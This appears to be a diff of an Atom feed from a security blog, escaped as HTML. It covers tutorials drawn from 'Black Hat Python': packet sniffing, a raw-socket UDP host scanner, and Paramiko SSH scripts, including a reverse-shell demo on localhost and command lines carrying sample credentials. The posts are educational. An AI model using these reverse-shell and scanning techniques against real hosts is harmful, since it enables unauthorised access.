     &lt;span class="n"&gt;img&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cv2&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;imread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-    &lt;span class="n"&gt;cascade&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cv2&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CascadeClassifier&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;haarcascade_upperbody.xml&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;cascade&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cv2&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CascadeClassifier&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;/home/bytegirl/Desktop/haarcascade_upperbody.xml&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
     &lt;span class="n"&gt;rects&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cascade&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;detectMultiScale&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;img&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mf"&gt;1.3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cv2&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cv&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CV_HAAR_SCALE_IMAGE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
     &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rects&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
         &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;
@@ -696,9 +633,9 @@ WARNING: No route found &lt;span class="k"&gt;for &lt;/span&gt;IPv6 destination 
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Running the script results in an output like this:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;Extracted: 165 images
-Detected: 16 faces
+&lt;p&gt;Running it results in an output like this:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;Extracted: &lt;span class="m"&gt;165&lt;/span&gt; images
+Detected: &lt;span class="m"&gt;16&lt;/span&gt; faces
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -707,14 +644,12 @@ Detected: 16 faces
 &lt;h2&gt;Further References:&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;&lt;a href="http://www.secdev.org/projects/scapy/doc/"&gt;Scapy Documentation&lt;/a&gt;.&lt;/li&gt;
-&lt;li&gt;&lt;a href="http://www.secdev.org/projects/scapy/doc/advanced_usage.html"&gt;Scapy Advanced Usage&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="http://www.secdev.org/projects/scapy/doc/usage.html"&gt;Scapy Examples&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;&lt;a href="http://sid.rstack.org/static/articles/w/i/f/Wifitap_EN_9613.html"&gt;Wifitap: PoC for communication over WiFi networks using traffic injection&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://code.google.com/p/surfjack/"&gt;SurfJack: hijack HTTP connections to steal cookies&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="http://www.nostarch.com/blackhatpython"&gt;Black Hat Python&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://github.com/bt3gl/My-Gray-Hacker-Resources"&gt;My Gray hat repo&lt;/a&gt;.&lt;/li&gt;
-&lt;li&gt;&lt;a href="http://thepacketgeek.com/scapy-p-08-making-a-christmas-tree-packet/"&gt;Making a xmas tree packet&lt;/a&gt;.&lt;/li&gt;
-&lt;/ul&gt;</summary><category term="Python"></category><category term="scapy"></category><category term="traceroute"></category><category term="PCAP"></category><category term="ARP_poisining"></category><category term="sniffing"></category><category term="Wireshark"></category><category term="packet_header"></category><category term="ICMP"></category><category term="fuzzing"></category><category term="nmap"></category><category term="ping"></category><category term="OpenCV"></category></entry><entry><title>Building a UDP Scanner with Python's socket Module</title><link href="http://bt3gl.github.io/building-a-udp-scanner-with-pythons-socket-module.html" rel="alternate"></link><updated>2014-12-16T00:00:00-05:00</updated><author><name>bt3</name></author><id>tag:bt3gl.github.io,2014-12-16:building-a-udp-scanner-with-pythons-socket-module.html</id><summary type="html">&lt;p&gt;When it comes to the reconnaissance of some target network, the start point is undoubtedly on host discovering. This task might come together with the ability to sniff and parse the packets flying through the network.&lt;/p&gt;
+&lt;/ul&gt;</summary><category term="Python"></category><category term="scapy"></category><category term="Book"></category><category term="traceroute"></category><category term="PCAP"></category><category term="ARP_poisining"></category><category term="sniffing"></category><category term="Wireshark"></category><category term="packet_header"></category></entry><entry><title>Black Hat Python: Building a UDP Scanner</title><link href="http://bt3gl.github.io/black-hat-python-building-a-udp-scanner.html" rel="alternate"></link><updated>2014-12-16T00:00:00-05:00</updated><author><name>bt3</name></author><id>tag:bt3gl.github.io,2014-12-16:black-hat-python-building-a-udp-scanner.html</id><summary type="html">&lt;p&gt;When it comes to the reconnaissance of some target network, the start point is undoubtedly on host discovering. This task might come together with the ability to sniff and parse the packets flying through the network.&lt;/p&gt;
 &lt;p&gt;A few weeks ago, I talked about &lt;a href="http://bt3gl.github.io/wiresharking-for-fun-or-profit.html"&gt;how to use Wireshark&lt;/a&gt; for packet sniffing, but what if you don't have Wireshark available to monitor a network traffic?&lt;/p&gt;
 &lt;p&gt;Again, Python comes with several solutions and today I'm going  through the steps to build a &lt;strong&gt;UDP Host discovery tool&lt;/strong&gt;. First, we are going to see how we deal with &lt;a href="http://en.wikipedia.org/wiki/Raw_socket"&gt;raw sockets&lt;/a&gt; to  write a simple sniffer, which is able to view and decode network packets. Then we are going to multithread this process within a subnet, which will result in our scanner.&lt;/p&gt;
 &lt;p&gt;The cool thing about &lt;strong&gt;raw sockets&lt;/strong&gt; is that they allow access to low-level networking information. For example, we can use it to check &lt;strong&gt;IP&lt;/strong&gt; and &lt;strong&gt;ICMP&lt;/strong&gt; headers, which are in the layer 3 of the OSI model (the network layer).&lt;/p&gt;
@@ -763,8 +698,8 @@ Remember that ICMP is essentially a special control protocol that issues error r
 
 &lt;p&gt;Then, in a second  window, we can  &lt;a href="http://en.wikipedia.org/wiki/Ping_(networking_utility)"&gt;ping&lt;/a&gt; or &lt;a href="http://en.wikipedia.org/wiki/Traceroute"&gt;traceroute&lt;/a&gt; some address, for example &lt;a href="www.google.com"&gt;www.google.com&lt;/a&gt;. The results will look like this:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;sudo python raw_socket.py
-&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;E\x00\x00T\xb3\xec\x00\x005\x01\xe4\x13J}\xe1\x11\xc0\xa8\x01r\x00\x00v\xdfx\xa2\x00\x01sr\x98T\x00\x00\x00\x008\xe3\r\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !&amp;quot;#$%&amp;amp;\&amp;#39;()*+,-./01234567&amp;#39;&lt;/span&gt;, &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;74.125.225.17&amp;#39;&lt;/span&gt;, 0&lt;span class="o"&gt;))&lt;/span&gt;
-&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;E\x00\x00T\xb4\x1b\x00\x005\x01\xe3\xe4J}\xe1\x11\xc0\xa8\x01r\x00\x00~\xd7x\xa2\x00\x02tr\x98T\x00\x00\x00\x00/\xea\r\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !&amp;quot;#$%&amp;amp;\&amp;#39;()*+,-./01234567&amp;#39;&lt;/span&gt;, &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;74.125.225.17&amp;#39;&lt;/span&gt;, 0&lt;span class="o"&gt;))&lt;/span&gt;
+&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;E\x00\x00T\xb3\xec\x00\x005\x01\xe4\x13J}\xe1\x11\xc0\xa8\x01r\x00\x00v\xdfx\xa2\x00\x01sr\x98T\x00\x00\x00\x008\xe3\r\x00\x00\x00\x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !&amp;quot;#$%&amp;amp;\&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt;*+,-./01234567&lt;span class="s1"&gt;&amp;#39;, (&amp;#39;&lt;/span&gt;74.125.225.17&lt;span class="s1"&gt;&amp;#39;, 0))&lt;/span&gt;
+&lt;span class="s1"&gt;(&amp;#39;&lt;/span&gt;E&lt;span class="se"&gt;\x&lt;/span&gt;00&lt;span class="se"&gt;\x&lt;/span&gt;00T&lt;span class="se"&gt;\x&lt;/span&gt;b4&lt;span class="se"&gt;\x&lt;/span&gt;1b&lt;span class="se"&gt;\x&lt;/span&gt;00&lt;span class="se"&gt;\x&lt;/span&gt;005&lt;span class="se"&gt;\x&lt;/span&gt;01&lt;span class="se"&gt;\x&lt;/span&gt;e3&lt;span class="se"&gt;\x&lt;/span&gt;e4J&lt;span class="o"&gt;}&lt;/span&gt;&lt;span class="se"&gt;\x&lt;/span&gt;e1&lt;span class="se"&gt;\x&lt;/span&gt;11&lt;span class="se"&gt;\x&lt;/span&gt;c0&lt;span class="se"&gt;\x&lt;/span&gt;a8&lt;span class="se"&gt;\x&lt;/span&gt;01r&lt;span class="se"&gt;\x&lt;/span&gt;00&lt;span class="se"&gt;\x&lt;/span&gt;00~&lt;span class="se"&gt;\x&lt;/span&gt;d7x&lt;span class="se"&gt;\x&lt;/span&gt;a2&lt;span class="se"&gt;\x&lt;/span&gt;00&lt;span class="se"&gt;\x&lt;/span&gt;02tr&lt;span class="se"&gt;\x&lt;/span&gt;98T&lt;span class="se"&gt;\x&lt;/span&gt;00&lt;span class="se"&gt;\x&lt;/span&gt;00&lt;span class="se"&gt;\x&lt;/span&gt;00&lt;span class="se"&gt;\x&lt;/span&gt;00/&lt;span class="se"&gt;\x&lt;/span&gt;ea&lt;span class="se"&gt;\r\x&lt;/span&gt;00&lt;span class="se"&gt;\x&lt;/span&gt;00&lt;span class="se"&gt;\x&lt;/span&gt;00&lt;span class="se"&gt;\x&lt;/span&gt;00&lt;span class="se"&gt;\x&lt;/span&gt;00&lt;span class="se"&gt;\x&lt;/span&gt;10&lt;span class="se"&gt;\x&lt;/span&gt;11&lt;span class="se"&gt;\x&lt;/span&gt;12&lt;span class="se"&gt;\x&lt;/span&gt;13&lt;span class="se"&gt;\x&lt;/span&gt;14&lt;span class="se"&gt;\x&lt;/span&gt;15&lt;span class="se"&gt;\x&lt;/span&gt;16&lt;span class="se"&gt;\x&lt;/span&gt;17&lt;span class="se"&gt;\x&lt;/span&gt;18&lt;span class="se"&gt;\x&lt;/span&gt;19&lt;span class="se"&gt;\x&lt;/span&gt;1a&lt;span class="se"&gt;\x&lt;/span&gt;1b&lt;span class="se"&gt;\x&lt;/span&gt;1c&lt;span class="se"&gt;\x&lt;/span&gt;1d&lt;span class="se"&gt;\x&lt;/span&gt;1e&lt;span class="se"&gt;\x&lt;/span&gt;1f !&lt;span class="s2"&gt;&amp;quot;#&lt;/span&gt;&lt;span class="nv"&gt;$%&lt;/span&gt;&lt;span class="s2"&gt;&amp;amp;\&amp;#39;()*+,-./01234567&amp;#39;, (&amp;#39;74.125.225.17&amp;#39;, 0))&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -850,8 +785,8 @@ Remember that ICMP is essentially a special control protocol that issues error r
 &lt;p&gt;Running the script in one terminal and sending a &lt;strong&gt;ping&lt;/strong&gt;  in other will return something like this (notice the ICMP type 0):&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;ping www.google.com
 PING www.google.com &lt;span class="o"&gt;(&lt;/span&gt;74.125.226.16&lt;span class="o"&gt;)&lt;/span&gt; 56&lt;span class="o"&gt;(&lt;/span&gt;84&lt;span class="o"&gt;)&lt;/span&gt; bytes of data.
-64 bytes from lga15s42-in-f16.1e100.net &lt;span class="o"&gt;(&lt;/span&gt;74.125.226.16&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="nv"&gt;icmp_seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;1 &lt;span class="nv"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;56 &lt;span class="nb"&gt;time&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;15.7 ms
-64 bytes from lga15s42-in-f16.1e100.net &lt;span class="o"&gt;(&lt;/span&gt;74.125.226.16&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="nv"&gt;icmp_seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;2 &lt;span class="nv"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;56 &lt;span class="nb"&gt;time&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;15.0 ms
+&lt;span class="m"&gt;64&lt;/span&gt; bytes from lga15s42-in-f16.1e100.net &lt;span class="o"&gt;(&lt;/span&gt;74.125.226.16&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="nv"&gt;icmp_seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="nv"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;56&lt;/span&gt; &lt;span class="nb"&gt;time&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;15.7 ms
+&lt;span class="m"&gt;64&lt;/span&gt; bytes from lga15s42-in-f16.1e100.net &lt;span class="o"&gt;(&lt;/span&gt;74.125.226.16&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="nv"&gt;icmp_seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="nv"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;56&lt;/span&gt; &lt;span class="nb"&gt;time&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;15.0 ms
 &lt;span class="o"&gt;(&lt;/span&gt;...&lt;span class="o"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -867,16 +802,16 @@ ICMP -&amp;gt; Type:0, Code:0
 
 &lt;p&gt;In the other hand, if we run &lt;strong&gt;traceroute&lt;/strong&gt; instead:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;traceroute www.google.com
-traceroute to www.google.com &lt;span class="o"&gt;(&lt;/span&gt;74.125.226.50&lt;span class="o"&gt;)&lt;/span&gt;, 30 hops max, 60 byte packets
- 1  * * *
- 2  * * *
- 3  67.59.255.137 &lt;span class="o"&gt;(&lt;/span&gt;67.59.255.137&lt;span class="o"&gt;)&lt;/span&gt;  17.183 ms 67.59.255.129 &lt;span class="o"&gt;(&lt;/span&gt;67.59.255.129&lt;span class="o"&gt;)&lt;/span&gt;  70.563 ms 67.59.255.137 &lt;span class="o"&gt;(&lt;/span&gt;67.59.255.137&lt;span class="o"&gt;)&lt;/span&gt;  21.480 ms
- 4  451be075.cst.lightpath.net &lt;span class="o"&gt;(&lt;/span&gt;65.19.99.117&lt;span class="o"&gt;)&lt;/span&gt;  14.639 ms rtr102.wan.hcvlny.cv.net &lt;span class="o"&gt;(&lt;/span&gt;65.19.99.205&lt;span class="o"&gt;)&lt;/span&gt;  24.086 ms 451be075.cst.lightpath.net &lt;span class="o"&gt;(&lt;/span&gt;65.19.107.117&lt;span class="o"&gt;)&lt;/span&gt;  24.025 ms
- 5  64.15.3.246 &lt;span class="o"&gt;(&lt;/span&gt;64.15.3.246&lt;span class="o"&gt;)&lt;/span&gt;  24.005 ms 64.15.0.218 &lt;span class="o"&gt;(&lt;/span&gt;64.15.0.218&lt;span class="o"&gt;)&lt;/span&gt;  23.961 ms 451be0c2.cst.lightpath.net &lt;span class="o"&gt;(&lt;/span&gt;65.19.120.194&lt;span class="o"&gt;)&lt;/span&gt;  23.935 ms
- 6  72.14.215.203 &lt;span class="o"&gt;(&lt;/span&gt;72.14.215.203&lt;span class="o"&gt;)&lt;/span&gt;  23.872 ms  46.943 ms *
- 7  216.239.50.141 &lt;span class="o"&gt;(&lt;/span&gt;216.239.50.141&lt;span class="o"&gt;)&lt;/span&gt;  48.906 ms  46.138 ms  46.122 ms
- 8  209.85.245.179 &lt;span class="o"&gt;(&lt;/span&gt;209.85.245.179&lt;span class="o"&gt;)&lt;/span&gt;  46.108 ms  46.095 ms  46.074 ms
- 9  lga15s43-in-f18.1e100.net &lt;span class="o"&gt;(&lt;/span&gt;74.125.226.50&lt;span class="o"&gt;)&lt;/span&gt;  45.997 ms  19.507 ms  16.607 ms
+traceroute to www.google.com &lt;span class="o"&gt;(&lt;/span&gt;74.125.226.50&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="m"&gt;30&lt;/span&gt; hops max, &lt;span class="m"&gt;60&lt;/span&gt; byte packets
+ &lt;span class="m"&gt;1&lt;/span&gt;  * * *
+ &lt;span class="m"&gt;2&lt;/span&gt;  * * *
+ &lt;span class="m"&gt;3&lt;/span&gt;  67.59.255.137 &lt;span class="o"&gt;(&lt;/span&gt;67.59.255.137&lt;span class="o"&gt;)&lt;/span&gt;  17.183 ms 67.59.255.129 &lt;span class="o"&gt;(&lt;/span&gt;67.59.255.129&lt;span class="o"&gt;)&lt;/span&gt;  70.563 ms 67.59.255.137 &lt;span class="o"&gt;(&lt;/span&gt;67.59.255.137&lt;span class="o"&gt;)&lt;/span&gt;  21.480 ms
+ &lt;span class="m"&gt;4&lt;/span&gt;  451be075.cst.lightpath.net &lt;span class="o"&gt;(&lt;/span&gt;65.19.99.117&lt;span class="o"&gt;)&lt;/span&gt;  14.639 ms rtr102.wan.hcvlny.cv.net &lt;span class="o"&gt;(&lt;/span&gt;65.19.99.205&lt;span class="o"&gt;)&lt;/span&gt;  24.086 ms 451be075.cst.lightpath.net &lt;span class="o"&gt;(&lt;/span&gt;65.19.107.117&lt;span class="o"&gt;)&lt;/span&gt;  24.025 ms
+ &lt;span class="m"&gt;5&lt;/span&gt;  64.15.3.246 &lt;span class="o"&gt;(&lt;/span&gt;64.15.3.246&lt;span class="o"&gt;)&lt;/span&gt;  24.005 ms 64.15.0.218 &lt;span class="o"&gt;(&lt;/span&gt;64.15.0.218&lt;span class="o"&gt;)&lt;/span&gt;  23.961 ms 451be0c2.cst.lightpath.net &lt;span class="o"&gt;(&lt;/span&gt;65.19.120.194&lt;span class="o"&gt;)&lt;/span&gt;  23.935 ms
+ &lt;span class="m"&gt;6&lt;/span&gt;  72.14.215.203 &lt;span class="o"&gt;(&lt;/span&gt;72.14.215.203&lt;span class="o"&gt;)&lt;/span&gt;  23.872 ms  46.943 ms *
+ &lt;span class="m"&gt;7&lt;/span&gt;  216.239.50.141 &lt;span class="o"&gt;(&lt;/span&gt;216.239.50.141&lt;span class="o"&gt;)&lt;/span&gt;  48.906 ms  46.138 ms  46.122 ms
+ &lt;span class="m"&gt;8&lt;/span&gt;  209.85.245.179 &lt;span class="o"&gt;(&lt;/span&gt;209.85.245.179&lt;span class="o"&gt;)&lt;/span&gt;  46.108 ms  46.095 ms  46.074 ms
+ &lt;span class="m"&gt;9&lt;/span&gt;  lga15s43-in-f18.1e100.net &lt;span class="o"&gt;(&lt;/span&gt;74.125.226.50&lt;span class="o"&gt;)&lt;/span&gt;  45.997 ms  19.507 ms  16.607 ms
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -996,7 +931,7 @@ Host up: 192.168.1.114
 &lt;li&gt;&lt;a href="https://netaddr.readthedocs.org/en/latest/tutorial_01.html"&gt;Tutorial to learn netaddr&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;&lt;a href="http://www.nostarch.com/blackhatpython"&gt;Black Hat Python&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://github.com/bt3gl/My-Gray-Hacker-Resources"&gt;My Gray hat repo&lt;/a&gt;.&lt;/li&gt;
-&lt;/ul&gt;</summary><category term="Python"></category><category term="socket"></category><category term="sniffing"></category><category term="UDP"></category><category term="netaddr"></category><category term="ICMP"></category><category term="scanner"></category><category term="packet_header"></category></entry><entry><title>Python's Paramiko Module</title><link href="http://bt3gl.github.io/pythons-paramiko-module.html" rel="alternate"></link><updated>2014-12-13T00:00:00-05:00</updated><author><name>bt3</name></author><id>tag:bt3gl.github.io,2014-12-13:pythons-paramiko-module.html</id><summary type="html">&lt;p&gt;This is the second post based on my readings from &lt;a href="http://www.nostarch.com/blackhatpython"&gt;Black Hat Python&lt;/a&gt;. Yesterday I talked about Python's &lt;a href="http://bt3gl.github.io/black-hat-python-networking-the-socket-module.html"&gt;socket module&lt;/a&gt; and today I'm talking about the &lt;a href="http://www.paramiko.org/"&gt;paramiko&lt;/a&gt; module.&lt;/p&gt;
+&lt;/ul&gt;</summary><category term="Python"></category><category term="socket"></category><category term="sniffing"></category><category term="UDP"></category><category term="netaddr"></category><category term="ICMP"></category><category term="scanner"></category><category term="packet_header"></category></entry><entry><title>Black Hat Python: The Paramiko Module</title><link href="http://bt3gl.github.io/black-hat-python-the-paramiko-module.html" rel="alternate"></link><updated>2014-12-13T00:00:00-05:00</updated><author><name>bt3</name></author><id>tag:bt3gl.github.io,2014-12-13:black-hat-python-the-paramiko-module.html</id><summary type="html">&lt;p&gt;This is the second post based on my readings from &lt;a href="http://www.nostarch.com/blackhatpython"&gt;Black Hat Python&lt;/a&gt;. Yesterday I talked about Python's &lt;a href="http://bt3gl.github.io/black-hat-python-networking-the-socket-module.html"&gt;socket module&lt;/a&gt; and today I'm talking about the &lt;a href="http://www.paramiko.org/"&gt;paramiko&lt;/a&gt; module.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Paramiko&lt;/strong&gt; is awesome!!! It uses my dear &lt;a href="https://www.dlitz.net/software/pycrypto/"&gt;PyCrypto&lt;/a&gt; to give us access to the &lt;a href="http://en.wikipedia.org/wiki/SSH2"&gt;SSH2 protocol&lt;/a&gt;, and it has a flexible and easy to use API.&lt;/p&gt;
 &lt;p&gt;You are going to see it with your own eyes: in this post we will see code for SSH clients and servers, reverse shells, and tunnel connections, and it will be smooth and fun (and remember that my source codes are available in my &lt;a href="https://github.com/bt3gl/My-Gray-Hacker-Resources"&gt;github repo&lt;/a&gt;)!&lt;/p&gt;
 &lt;p&gt;Shall we start?&lt;/p&gt;
@@ -1116,11 +1051,11 @@ Host up: 192.168.1.114
 &lt;p&gt;Easy, huh?&lt;/p&gt;
 &lt;h3&gt;Running the Script&lt;/h3&gt;
 &lt;p&gt;We are ready to run our script. If we use the example in the usage function (and supposing the account exists in that host), we will see the following:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;ssh_client.py 129.49.76.26 -u buffy -p 22 -a killvampires  -c &lt;span class="nb"&gt;pwd&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;ssh_client.py 129.49.76.26 -u buffy -p &lt;span class="m"&gt;22&lt;/span&gt; -a killvampires  -c &lt;span class="nb"&gt;pwd&lt;/span&gt;
 &lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Initializing connection to 129.49.76.26
 &lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; User &lt;span class="nb"&gt;set &lt;/span&gt;to buffy
 &lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; The port to be used is 22.
-&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; A password with length 12 was submitted.
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; A password with length &lt;span class="m"&gt;12&lt;/span&gt; was submitted.
 &lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Executing the &lt;span class="nb"&gt;command&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;pwd&amp;#39;&lt;/span&gt; in the host...
 
 /home/buffy.
@@ -1300,22 +1235,22 @@ Host up: 192.168.1.114
 &lt;h3&gt;Running both Scripts&lt;/h3&gt;
 &lt;p&gt;Let's run each script in a different terminal. First, the server:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;ssh_server.py localhost 22
-&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Listening &lt;span class="k"&gt;for &lt;/span&gt;connection ...
+&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Listening &lt;span class="k"&gt;for&lt;/span&gt; connection ...
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Then the client:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;ssh_client_reverse.py localhost -p 22 -u buffy -a killvampires
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;ssh_client_reverse.py localhost -p &lt;span class="m"&gt;22&lt;/span&gt; -u buffy -a killvampires
 &lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Initializing connection to localhost
 &lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; User &lt;span class="nb"&gt;set &lt;/span&gt;to buffy
 &lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; The port to be used is 22.
-&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; A password with length 12 was submitted.
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; A password with length &lt;span class="m"&gt;12&lt;/span&gt; was submitted.
 Welcome to Buffy&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s SSH
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Now we can send any command from the server side to run  in the client: we have a reversed shell!&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Listening &lt;span class="k"&gt;for &lt;/span&gt;connection ...
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Listening &lt;span class="k"&gt;for&lt;/span&gt; connection ...
 &lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Connection Established!
 &lt;span class="o"&gt;[&lt;/span&gt;+&lt;span class="o"&gt;]&lt;/span&gt; Authenticated!
 Enter &lt;span class="nb"&gt;command&lt;/span&gt;: ls
@@ -1338,7 +1273,7 @@ Enter &lt;span class="nb"&gt;command&lt;/span&gt;:
 &lt;li&gt;&lt;a href="https://github.com/tristanfisher/ogre/blob/master/ogre"&gt;Ogre: port scanner and brute-force tool (from a friend I met at Hacker School)&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="http://www.nostarch.com/blackhatpython"&gt;Black Hat Python&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://github.com/bt3gl/My-Gray-Hacker-Resources"&gt;My Gray hat repo&lt;/a&gt;.&lt;/li&gt;
